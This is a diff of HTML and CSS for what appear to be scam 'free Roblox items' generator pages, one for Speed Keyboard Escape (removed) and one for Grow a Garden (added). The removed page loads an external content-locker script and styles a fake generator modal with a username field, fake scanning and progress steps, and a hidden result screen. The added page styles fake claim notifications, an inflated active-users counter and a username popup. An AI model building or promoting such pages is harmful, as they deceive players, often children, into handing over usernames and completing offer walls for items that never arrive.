@@ -1,485 +1,758 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="ltr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Speed Keyboard Escape · Free Items & Boosts</title>
-  <!-- Fonts & Icons -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&family=Luckiest+Guy&family=Lilita+One&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  
-  <!-- Content Locker Script -->
-  <script type="text/javascript">
-    var lYbfe_UFG_AQBCLc={"it":4619086,"key":"ee141"};
-</script>
-<script src="https://d19k1sh57v5k0g.cloudfront.net/e62f6c3.js"></script>
-  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>GROW A GARDEN</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@900&family=Orbitron:wght@900&display=swap" rel="stylesheet">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <style>
-    /* Reset & base */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    /* LTR Styles */
     body {
-      background: #0a0f0b;
-      font-family: 'Inter', sans-serif;
-      color: #e8f0e8;
+      margin: 0;
+      padding: 0;
       min-height: 100vh;
+      box-sizing: border-box;
+      font-family: 'Cairo', Arial, sans-serif;
+      position: relative;
       overflow-x: hidden;
-      padding: 0 0 2rem 0;
+      text-align: left;
+      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect fill="%2354d33a" width="100" height="100"/><rect fill="%2363e645" width="50" height="50" x="25" y="25" opacity="0.8"/><rect fill="%234f8a2f" width="30" height="30" x="35" y="35" opacity="0.6"/></svg>') repeat;
+      background-size: 100px 100px;
+      background-position: center;
     }
-    .container { max-width: 720px; margin: 0 auto; padding: 0 1rem; }
-    img { max-width: 100%; display: block; }
-    button { cursor: pointer; font-family: inherit; }
-
-    /* animated background */
-    .animated-background {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 0;
-      overflow: hidden;
-    }
-    .bg-item-img {
-      position: absolute;
-      top: 12%;
-      opacity: 0.08;
-      animation: floatBg var(--duration, 18s) infinite alternate ease-in-out;
-      animation-delay: var(--delay, 0s);
-      width: 70px;
-    }
-    .bg-item-img img { width: 100%; }
-    @keyframes floatBg {
-      0% { transform: translateY(0px) rotate(0deg) scale(1); }
-      100% { transform: translateY(80px) rotate(12deg) scale(1.1); }
-    }
-
-    /* main container */
-    .main-container { position: relative; z-index: 2; }
-
-    /* language switcher */
-    .lang-switcher {
-      position: fixed;
-      top: 16px;
-      right: 16px;
-      z-index: 40;
-      background: #1e2a1e;
-      border-radius: 40px;
-      padding: 4px 10px 4px 6px;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.6);
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      border: 1px solid #3a5a3a;
-    }
-    .lang-label { font-size: 0.8rem; font-weight: 600; color: #b8d9b8; }
-    .lang-icon { font-size: 1rem; margin-right: 2px; }
-    .lang-select {
-      background: transparent;
-      border: none;
-      color: #c6e2c6;
-      font-weight: 600;
-      font-size: 0.75rem;
-      outline: none;
-      padding: 2px 0;
-    }
-    .lang-select option { background: #1a261a; }
-
-    /* Hero */
-    .page-hero {
+    .logo-container {
       text-align: center;
-      padding: 2.2rem 0 1.2rem 0;
-      background: radial-gradient(circle at 30% 20%, #1b3a1b, #0a120a 80%);
-      border-radius: 32px;
-      margin: 1rem 0 1.5rem 0;
-      border: 1px solid #2a4a2a;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+      padding-top: 15px;
     }
-    .hero-logo {
-      width: 120px;
-      height: auto;
-      margin: 0 auto 0.8rem;
-      filter: drop-shadow(0 4px 12px #62b86266);
-      display: block;
+    .logo-container img {
+      max-width: 180px;
+      filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.5));
     }
-    .hero-title {
-      font-family: 'Luckiest Guy', cursive;
-      font-size: 1.8rem;
-      letter-spacing: 1px;
-      background: linear-gradient(135deg, #b6f0b6, #7ed97e);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      line-height: 1.2;
-      padding: 0 0.5rem;
+    .content {
+      position: relative;
+      z-index: 1;
     }
-    .hero-sub {
-      font-size: 1rem;
-      color: #b0d3b0;
-      margin-top: 0.25rem;
-      font-weight: 500;
-    }
-    .social-proof {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: #1e321e;
-      padding: 6px 18px;
-      border-radius: 60px;
-      margin-top: 12px;
-      font-size: 0.85rem;
-      color: #b2d9b2;
-      border: 1px solid #3d623d;
-    }
-    .dot {
-      width: 8px; height: 8px;
-      background: #6fdf6f;
-      border-radius: 50%;
-      display: inline-block;
-      animation: pulse 1.8s infinite;
-    }
-    @keyframes pulse { 0% { opacity: 0.4; transform: scale(0.9); } 50% { opacity: 1; transform: scale(1.2); } }
-
-    /* shop panel */
-    .shop-panel {
-      background: #111c11;
-      border-radius: 28px;
-      border: 1px solid #2a4a2a;
-      overflow: hidden;
-      box-shadow: 0 14px 40px rgba(0,0,0,0.8);
-      margin-bottom: 2.5rem;
-    }
-    .store-banner {
+    .top-bar {
+      width: 100vw;
       display: flex;
+      flex-direction: row;
+      justify-content: center;
       align-items: center;
-      justify-content: space-between;
-      background: #1b2b1b;
-      padding: 12px 16px;
-      border-bottom: 1px solid #2e502e;
-      flex-wrap: wrap;
-    }
-    .store-banner-left { display: flex; align-items: center; gap: 10px; }
-    .store-logo { width: 48px; height: 48px; object-fit: contain; background: #233823; border-radius: 16px; padding: 4px; }
-    .store-banner-tabs { display: flex; gap: 6px; }
-    .store-tab {
-      background: #2c422c;
-      border: none;
-      color: #aacfaa;
-      padding: 6px 14px;
-      border-radius: 40px;
-      font-weight: 700;
-      font-size: 0.8rem;
-      transition: all 0.2s;
-    }
-    .store-tab.active { background: #4d864d; color: #fff; box-shadow: 0 0 12px #4d864d88; }
-
-    /* shop items - BIGGER FOR PHONE */
-    .shop-items-list {
-      padding: 12px 8px;
-      display: flex;
-      flex-direction: column;
       gap: 14px;
+      box-sizing: border-box;
+      padding: 16px 0 0 0;
+      margin-bottom: 8px;
     }
-    .shop-item {
+    .active-users-box {
+      background: #0066cc;
+      border: 2.3px solid #fff;
+      border-radius: 13px;
+      padding: 13px 18px;
       display: flex;
       align-items: center;
-      gap: 16px;
-      background: #162116;
-      padding: 12px 16px 12px 12px;
-      border-radius: 20px;
-      border: 1px solid #2b482b;
-      transition: 0.15s;
+      font-size: 1.5em;
+      min-width: 220px;
+      max-width: 70vw;
+      margin: 0;
+      box-shadow: 0 1px 6px 0 rgba(0,0,0,0.09);
+      font-weight: 900;
+      font-family: 'Cairo', Arial, sans-serif;
+      height: 54px;
+      justify-content: center;
       cursor: pointer;
-      min-height: 80px;
-    }
-    .shop-item:hover { background: #1f321f; border-color: #4f834f; }
-    .shop-item-img-box {
-      width: 72px;
-      height: 72px;
-      background: #0b170b;
-      border-radius: 18px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 2px solid #3c613c;
-      flex-shrink: 0;
-      padding: 6px;
-    }
-    .shop-item-img-box img { width: 100%; height: auto; object-fit: contain; }
-    .shop-item-info { flex: 1; min-width: 0; }
-    .shop-item-name { 
-      font-weight: 700; 
-      font-size: 1.1rem; 
-      color: #daf0da;
-      margin-bottom: 2px;
-    }
-    .shop-item-stock { 
-      font-size: 0.8rem; 
-      color: #88aa88;
-      margin-bottom: 3px;
-    }
-    .shop-item-rarity {
-      display: inline-block;
-      font-size: 0.7rem;
-      font-weight: 700;
-      padding: 3px 14px;
-      border-radius: 30px;
-      letter-spacing: 0.3px;
-      background: #2f4a2f;
-      color: #bce0bc;
-      margin-top: 2px;
-    }
-    .rarity-mythic { background: #7b4f9e; color: #f2daff; }
-    .rarity-legendary { background: #b87c2b; color: #ffefc0; }
-    .rarity-epic { background: #4b6b8a; color: #d0e6ff; }
-    .roblox-claim-btn {
-      background: #3e7a3e;
-      border: none;
-      color: white;
-      font-weight: 800;
-      padding: 12px 22px;
-      border-radius: 60px;
-      font-size: 1rem;
-      box-shadow: 0 4px 0 #1f451f;
-      transition: 0.1s;
-      flex-shrink: 0;
-      min-width: 80px;
-    }
-    .roblox-claim-btn:active { transform: translateY(3px); box-shadow: 0 1px 0 #1f451f; }
-
-    /* footer */
-    .site-footer {
-      text-align: center;
-      padding: 2rem 0 1rem;
-      color: #5e7a5e;
-      font-size: 0.8rem;
-      border-top: 1px solid #1f2f1f;
-      margin-top: 1rem;
-    }
-
-    /* ----- GEN MODAL (locker) ----- */
-    .gen-modal {
-      display: none;
-      position: fixed;
-      inset: 0;
-      z-index: 999;
-      align-items: center;
-      justify-content: center;
-      padding: 1rem;
-    }
-    .gen-modal.active { display: flex; }
-    .gen-backdrop {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.8);
-      backdrop-filter: blur(6px);
-    }
-    .gen-box {
+      transition: transform 0.17s cubic-bezier(.17,.67,.83,.67);
+      will-change: transform;
       position: relative;
-      z-index: 10;
-      background: #142014;
-      max-width: 480px;
-      width: 100%;
-      border-radius: 32px;
-      border: 1px solid #3c683c;
-      padding: 1.8rem 1.2rem 1.5rem;
-      box-shadow: 0 30px 60px rgba(0,0,0,0.9);
-      max-height: 95vh;
-      overflow-y: auto;
-    }
-    .gen-header { display: flex; align-items: center; gap: 12px; margin-bottom: 1.2rem; }
-    .gen-logo-row { display: flex; align-items: center; gap: 10px; }
-    .gen-logo-img { width: 44px; height: 44px; background: #233823; border-radius: 16px; padding: 4px; }
-    .gen-label { font-weight: 800; font-size: 1.1rem; color: #b3e0b3; letter-spacing: -0.2px; }
-
-    .gen-screen { display: none; }
-    .gen-screen.active { display: block; }
-
-    .gen-item-preview {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      background: #1d2d1d;
-      padding: 12px;
-      border-radius: 20px;
-      margin-bottom: 1.2rem;
-      border: 1px solid #3d613d;
-    }
-    .gen-item-thumb { width: 56px; height: 56px; object-fit: contain; background: #0d180d; border-radius: 16px; padding: 6px; }
-    .gen-item-name { font-weight: 700; font-size: 1.1rem; }
-    .gen-item-badge { font-size: 0.65rem; background: #4e9e4e; padding: 2px 14px; border-radius: 40px; font-weight: 700; display: inline-block; margin-top: 4px; }
-
-    .gen-desc { color: #b8d4b8; font-size: 0.9rem; margin-bottom: 1rem; }
-    .gen-input-wrap {
-      display: flex;
-      align-items: center;
-      background: #0d180d;
-      border-radius: 60px;
-      padding: 0 16px;
-      border: 1px solid #3b613b;
-      margin-bottom: 1rem;
-    }
-    .gen-input-icon { color: #5f8a5f; margin-right: 8px; }
-    .gen-input {
-      background: transparent;
-      border: none;
-      padding: 14px 0;
-      width: 100%;
-      color: #e5f5e5;
-      font-size: 1rem;
-      outline: none;
-    }
-    .gen-input::placeholder { color: #5b7d5b; }
-    .gen-error-msg { color: #f7a1a1; font-size: 0.8rem; min-height: 1.4rem; margin-bottom: 0.6rem; }
-    .gen-btn-primary {
-      width: 100%;
-      background: linear-gradient(145deg, #47a347, #2b782b);
-      border: none;
-      color: white;
-      font-weight: 800;
-      padding: 16px;
-      border-radius: 60px;
-      font-size: 1.1rem;
-      box-shadow: 0 6px 0 #1b4f1b;
-      transition: 0.08s;
-    }
-    .gen-btn-primary:active { transform: translateY(4px); box-shadow: 0 2px 0 #1b4f1b; }
-    .gen-security-row {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 0.75rem;
-      color: #6f966f;
-      margin-top: 12px;
-      justify-content: center;
-    }
-    .gen-security-dot {
-      width: 6px; height: 6px;
-      background: #5cb85c;
-      border-radius: 50%;
-      display: inline-block;
-    }
-
-    /* progress screen */
-    .gen-progress-header { text-align: center; margin-bottom: 1.2rem; }
-    .avatar-scanner-container {
-      position: relative;
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 10px;
-      border-radius: 50%;
-      background: #1a2a1a;
-      border: 2px solid #4d8a4d;
       overflow: hidden;
     }
-    .scanner-avatar-img { width: 100%; height: 100%; object-fit: cover; }
-    .scanner-laser {
+    .active-users-box:after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      transition: 0.5s;
+    }
+    .active-users-box:hover:after {
+      left: 100%;
+    }
+    .active-users-box:active {
+      transform: scale(1.09) rotate(-2deg);
+      box-shadow: 0 0 0 6px #fff5, 0 2px 6px #0003;
+      z-index: 2;
+      filter: brightness(1.08);
+      background: #0055aa;
+    }
+    .active-users-box span:first-child {
+      color: #fff;
+      margin-right: 8px;
+      font-weight: 900;
+      font-size: 1.1em;
+      letter-spacing: 1px;
+    }
+    .active-users-count {
+      font-weight: 900;
+      font-family: 'Orbitron', 'Cairo', Arial, sans-serif;
+      margin-left: 8px;
+      font-size: 1.15em;
+      color: #FFD700;
+      text-shadow: 0 0 8px rgba(255, 215, 0, 0.8);
+    }
+    .select-title {
+      margin: 30px 0 24px 0;
+      text-align: center;
+      font-size: 1.7em;
+      color: #fff;
+      font-family: 'Cairo', Arial, sans-serif;
+      letter-spacing: .4px;
+      font-weight: 900;
+      text-shadow: 0 1px 5px #2225;
+      padding: 8px 0;
+      position: relative;
+    }
+    .select-title:after {
+      content: '';
       position: absolute;
       bottom: 0;
+      left: 25%;
+      width: 50%;
+      height: 3px;
+      background: linear-gradient(to right, transparent, #ffd700, transparent);
+    }
+    .items-grid {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 26px;
+      margin-bottom: 40px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .items-row {
+      display: flex;
+      gap: 22px;
+      width: 100%;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+    .item-card {
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px #0002;
+      padding: 10px 8px 8px 8px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 170px;
+      min-width: 100px;
+      max-width: 31vw;
+      border: 2px solid #eee;
+      margin: 0;
+      position: relative;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      will-change: transform;
+      overflow: hidden;
+    }
+    .item-card:before {
+      content: '';
+      position: absolute;
+      top: 0;
       left: 0;
       width: 100%;
-      height: 6px;
-      background: linear-gradient(90deg, transparent, #8eff8e, transparent);
-      animation: scan 2s infinite linear;
+      height: 100%;
+      background: linear-gradient(45deg, rgba(255,215,0,0.1), rgba(255,215,0,0.05));
+      opacity: 0;
+      transition: opacity 0.3s;
     }
-    @keyframes scan { 0% { bottom: 0; opacity: 0.3; } 50% { bottom: 80%; opacity: 1; } 100% { bottom: 0; opacity: 0.3; } }
-    .gen-progress-label { font-weight: 600; color: #bfe6bf; }
-
-    .gen-steps { display: flex; flex-direction: column; gap: 8px; margin: 1rem 0; }
-    .gen-step {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      background: #1a2a1a;
-      padding: 8px 14px;
-      border-radius: 40px;
-      border-left: 4px solid #2d592d;
+    .item-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 8px 15px rgba(0,0,0,0.2);
     }
-    .gen-step-icon {
-      width: 28px; height: 28px;
-      background: #2c4a2c;
-      border-radius: 50%;
+    .item-card:active {
+      transform: scale(1.09) rotate(-2deg);
+      box-shadow: 0 0 0 6px #ffd70033, 0 2px 12px #0003;
+      z-index: 2;
+      filter: brightness(1.08);
+    }
+    .item-card.selected {
+      background: linear-gradient(135deg, #ffd700, #ffbf00);
+      border: 2px solid #d4af37;
+      box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
+      animation: goldenGlow 1.5s infinite alternate;
+    }
+    @keyframes goldenGlow {
+      from {
+        box-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+      }
+      to {
+        box-shadow: 0 0 25px rgba(255, 215, 0, 0.9);
+      }
+    }
+    .item-img {
+      width: 110px;
+      height: 110px;
+      object-fit: cover;
+      border-radius: 8px;
+      background: #eaeaea;
+      margin-bottom: 10px;
+      border: none;
+      image-rendering: pixelated;
+      box-shadow: 0 0 13px #0001;
+      transition: box-shadow 0.12s, filter 0.12s;
+      display: block;
+      position: relative;
+      z-index: 1;
+    }
+    .item-card.selected .item-img {
+      box-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
+      filter: brightness(1.05) contrast(1.1);
+    }
+    .item-name {
+      font-size: 1.08em;
+      color: #333;
+      font-family: 'Cairo', Arial, sans-serif;
+      text-align: center;
+      font-weight: 900;
+      letter-spacing: .2px;
+      margin-bottom: 0;
+      line-height: 1.2;
+      width: 100%;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+      background: none;
+      border-radius: 0;
+      border: none;
+      margin-top: 0;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-weight: 800;
-      font-size: 0.8rem;
-      color: #a8d4a8;
+      box-sizing: border-box;
+      min-height: 28px;
+      position: relative;
+      z-index: 1;
     }
-    .gen-step-title { font-weight: 600; font-size: 0.9rem; }
-    .gen-step-sub { font-size: 0.7rem; color: #88aa88; }
-    .gen-progress-bar-wrap {
-      background: #142114;
-      height: 8px;
-      border-radius: 20px;
+    .item-card.selected .item-name {
+      color: #8b7500;
+      text-shadow: 0 0 2px rgba(255, 215, 0, 0.5);
+    }
+    
+    /* تم تعديل هذا القسم لتحريك الإشعارات إلى الجانب الأيسر */
+    .cliameds {
+      position: fixed;
+      bottom: 65px;
+      left: 15px; /* تغيير إلى الجانب الأيسر */
+      z-index: 9999;
+    }
+    .message {
+      background-color: rgba(135, 206, 250, 0.85);
+      display: flex;
+      font-size: .8rem;
+      align-items: center;
+      padding: 10px 20px;
+      border-radius: 6px;
+      border: 2px solid rgba(238, 204, 159, 0.7);
+      position: relative;
       overflow: hidden;
-      margin: 10px 0 6px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     }
-    .gen-progress-bar {
-      width: 0%;
-      height: 100%;
-      background: linear-gradient(90deg, #55b555, #a3e6a3);
-      border-radius: 20px;
-      transition: width 0.3s;
+    .message:after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -60%;
+      width: 20%;
+      height: 200%;
+      background: rgba(255, 255, 255, 0.3);
+      transform: rotate(30deg);
+      transition: all 0.5s;
     }
-
-    /* Hide screen 3 completely - we only show locker */
-    #gen-screen-3 {
-      display: none !important;
+    .message:hover:after {
+      left: 120%;
     }
-
-    /* responsive - make items even bigger on small phones */
-    @media (max-width: 480px) {
-      .hero-title { font-size: 1.5rem; }
-      .shop-item {
-        padding: 14px 14px 14px 12px;
-        gap: 14px;
-        min-height: 90px;
+    .message .img {
+      padding-right: 10px; /* تعديل ليكون الصورة على اليسار والنص على اليمين */
+      z-index: 2;
+    }
+    .message .img img {
+      width: 50px;
+      background: #fff;
+      border-radius: 50%;
+      height: 50px;
+      border: 2px solid #fff;
+      box-shadow: 0 0 8px rgba(0,0,0,0.3);
+    }
+    .message .more {
+      z-index: 2;
+    }
+    .message .more div:first-child {
+      font-weight: bold;
+      color: #0066cc;
+    }
+    .message .more div:last-child {
+      color: #333;
+      font-weight: 700;
+    }
+    @media (min-width: 800px) {
+      .cliameds {
+        bottom: 10px;
       }
-      .shop-item-img-box {
+    }
+    
+    /* التعديل الجديد للشاشات الكبيرة (الحاسوب) فقط */
+    @media (min-width: 901px) {
+      .items-grid {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr); /* 5 أعمدة */
+        gap: 20px;
+        justify-content: center;
+        padding: 0 5%;
+      }
+      .items-row {
+        display: contents; /* يجعل العناصر تظهر مباشرة في الجريد */
+      }
+      .item-card {
+        width: 100%;
+        max-width: 180px;
+        margin: 0 auto;
+      }
+    }
+    
+    /* إرجاع تصميم الهاتف كما كان تمامًا */
+    @media (max-width: 900px) {
+      .items-grid {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 26px;
+      }
+      .items-row {
+        display: flex;
+        gap: 22px;
+        width: 100%;
+        justify-content: center;
+      }
+      .active-users-box {
+        font-size: 1.1em;
+        min-width: 145px;
+        padding: 9px 8px;
+        height: 38px;
+      }
+      .select-title {
+        font-size: 1.1em;
+      }
+      .items-row {
+        gap: 10px;
+      }
+      .item-card {
+        width: 31vw;
+        min-width: 0;
+        max-width: 32vw;
+        padding: 8px 2px 6px 2px;
+      }
+      .item-img {
         width: 80px;
         height: 80px;
-        padding: 8px;
       }
-      .shop-item-name { 
-        font-size: 1.2rem; 
+      .item-name {
+        min-height: 22px;
+        font-size: 0.95em;
       }
-      .shop-item-stock { 
-        font-size: 0.85rem; 
-      }
-      .shop-item-rarity {
-        font-size: 0.75rem;
-        padding: 4px 16px;
-      }
-      .roblox-claim-btn {
-        padding: 14px 20px;
-        font-size: 1rem;
-        min-width: 80px;
-      }
-      .gen-box { padding: 1.2rem 0.8rem; }
     }
-
-    /* For very small screens */
-    @media (max-width: 380px) {
-      .shop-item {
-        flex-wrap: wrap;
-        gap: 10px;
-        padding: 12px;
+    @media (max-width: 700px) {
+      .items-grid {
+        gap: 5vw;
       }
-      .shop-item-img-box {
-        width: 70px;
-        height: 70px;
+      .items-row {
+        gap: 5vw;
       }
-      .roblox-claim-btn {
+      .item-card {
+        width: 29vw;
+        max-width: 33vw;
+        min-width: 0;
+        padding: 5vw 1vw 2vw 1vw;
+      }
+      .item-img {
+        width: 24vw;
+        height: 24vw;
+        min-width: 62px;
+        min-height: 62px;
+        max-width: 110px;
+        max-height: 110px;
+      }
+      .item-name {
+        font-size: 0.92em;
+        min-height: 20px;
+      }
+    }
+    @media (max-width: 500px) {
+      .items-row {
+        gap: 2vw;
+      }
+      .item-card {
+        width: 30vw;
+        max-width: 33vw;
+        min-width: 0;
+        padding: 2vw 0.5vw 2vw 0.5vw;
+      }
+      .item-img {
+        width: 26vw;
+        height: 26vw;
+        min-width: 54px;
+        min-height: 54px;
+        max-width: 96px;
+        max-height: 96px;
+      }
+      .item-name {
+        font-size: 0.89em;
+        min-height: 16px;
+      }
+      .logo-container img {
+        max-width: 140px;
+      }
+      .cliameds {
+        left: 5px; /* تعديل موضع الإشعارات على الشاشات الصغيرة */
+      }
+    }
+    @media (max-width: 900px) {
+      .items-row {
+        flex-direction: row;
+        justify-content: center;
         width: 100%;
-        padding: 14px;
-        min-width: unset;
       }
+      .item-card {
+        margin-bottom: 0;
+      }
+    }
+    @media (max-width: 600px) {
+      .items-row {
+        flex-direction: row;
+        justify-content: center;
+        width: 100%;
+      }
+      .item-card {
+        margin-bottom: 0;
+      }
+      .top-bar {
+        padding-top: 9px;
+      }
+    }
+    
+    /* Purchase popup styles */
+    .purchase-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .popup-content {
+      background-color: #333;
+      padding: 25px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 380px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+      text-align: center;
+      color: white;
+      margin: auto;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    
+    .popup-header {
+      position: relative;
+      padding-bottom: 20px;
+      margin-bottom: 15px;
+    }
+    
+    .popup-header h3 {
+      font-size: 24px;
+      margin: 0;
+      color: white;
+      font-weight: 700;
+    }
+    
+    .popup-header:after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 10%;
+      right: 10%;
+      height: 3px;
+      background-color: #666;
+    }
+    
+    .item-popup-image {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 0.3cm auto;
+      border: 3px solid #444;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    
+    .item-confirm {
+      font-size: 18px;
+      margin: 0.3cm 0;
+      color: white;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    
+    .input-group {
+      margin-bottom: 25px;
+      text-align: left;
+    }
+    
+    .input-group label {
+      display: none;
+    }
+    
+    .input-group input {
+      width: 92%;
+      padding: 15px 12px;
+      background-color: white;
+      color: #333;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 15px;
+      font-weight: 600;
+    }
+    
+    .input-group input::placeholder {
+      color: #999;
+      font-weight: 700;
+    }
+    
+    .popup-buttons {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+    }
+    
+    .cancel-btn {
+      background-color: #555;
+      color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      flex: 1;
+      font-size: 15px;
+    }
+    
+    .free-btn {
+      background-color: white;
+      border: none;
+      padding: 12px;
+      border-radius: 5px;
+      cursor: pointer;
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+    }
+    
+    .free-btn .free-badge {
+      color: #333;
+      font-weight: 900;
+      display: flex;
+      align-items: center;
+      font-size: 15px;
+    }
+    
+    .free-btn .free-icon {
+      width: 20px;
+      height: 20px;
+      background-image: url('https://tse4.mm.bing.net/th?id=OIP.AZtpRYaMROCrDtdpzAYzvgHaH5&pid=Api&P=0&h=180');
+      background-size: contain;
+      background-repeat: no-repeat;
+    }
+    
+    /* Searching state styles */
+    .searching-container {
+      text-align: center;
+      padding: 20px;
+    }
+    
+    .folding {
+      margin: 20px auto;
+      width: 70px;
+      height: 70px;
+      position: relative;
+      transform: rotateZ(45deg);
+    }
+    
+    .square {
+      position: absolute;
+      top: 30%;
+      right: 30%;
+      width: 30px;
+      height: 30px;
+      background-color: #000;
+      transform: rotateZ(87deg);
+    }
+    
+    .folding .sk-cube {
+      float: left;
+      width: 50%;
+      height: 50%;
+      position: relative;
+      transform: scale(1.1);
+    }
+    
+    .folding .sk-cube:before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #fff;
+      animation: sk-foldCubeAngle 2.4s infinite linear both;
+      transform-origin: 100% 100%;
+    }
+    
+    .folding .sk-cube2 {
+      transform: scale(1.1) rotateZ(90deg);
+    }
+    
+    .folding .sk-cube3 {
+      transform: scale(1.1) rotateZ(180deg);
+    }
+    
+    .folding .sk-cube4 {
+      transform: scale(1.1) rotateZ(270deg);
+    }
+    
+    .folding .sk-cube2:before {
+      animation-delay: 0.3s;
+    }
+    
+    .folding .sk-cube3:before {
+      animation-delay: 0.6s;
+    }
+    
+    .folding .sk-cube4:before {
+      animation-delay: 0.9s;
+    }
+    
+    @keyframes sk-foldCubeAngle {
+      0%, 10% {
+        transform: perspective(140px) rotateX(-180deg);
+        opacity: 0;
+      }
+      25%, 75% {
+        transform: perspective(140px) rotateX(0deg);
+        opacity: 1;
+      }
+      90%, 100% {
+        transform: perspective(140px) rotateY(180deg);
+        opacity: 0;
+      }
+    }
+    
+    .searching-text {
+      color: white;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+    
+    /* Success state styles */
+    .result-avatar {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 15px auto;
+      border: 3px solid #444;
+    }
+    
+    .result-username {
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+    
+    .get-item-now-btn {
+      background-color: white;
+      color: #333;
+      border: none;
+      padding: 12px;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      margin-top: 15px;
+      transition: all 0.3s;
+    }
+    
+    .get-item-now-btn:hover {
+      background-color: #f0f0f0;
+    }
+    
+    .d-none {
+      display: none !important;
+    }
+    
+    .user-error {
+      color: #ff6b6b;
+      font-size: 14px;
+      margin-top: 5px;
+      text-align: center;
+    }
+    
+    /* Mobile only adjustments */
+    @media (max-width: 480px) {
+      .item-popup-image {
+        width: 100px;
+        height: 100px;
+      }
+      
+      .popup-header:after {
+        left: 5%;
+        right: 5%;
+        height: 3px;
+      }
+      
+      .popup-content {
+        width: 90%;
+        max-width: 300px;
+        padding: 15px;
+      }
+    }
+    
+    /* Sound icon for buttons */
+    .sound-icon {
+      margin-left: 5px;
+      font-size: 14px;
     }
   </style>
-<link rel="me" href="https://www.blogger.com/profile/01127635366951914422" />
+<link rel="me" href="https://www.blogger.com/profile/09867707712002395245" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
-<link rel="me" href="https://www.blogger.com/profile/12538772780929002052" />
+<link rel="me" href="https://www.blogger.com/profile/11676149117892913435" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<link rel="me" href="https://www.blogger.com/profile/05414339822839375210" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 
@@ -492,237 +765,407 @@
   }
 </script>
 
-<link rel="me" href="https://www.blogger.com/profile/00244131644782156266" />
+<link rel="me" href="https://www.blogger.com/profile/09270213284334604405" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+<script type="text/javascript" language="javascript">
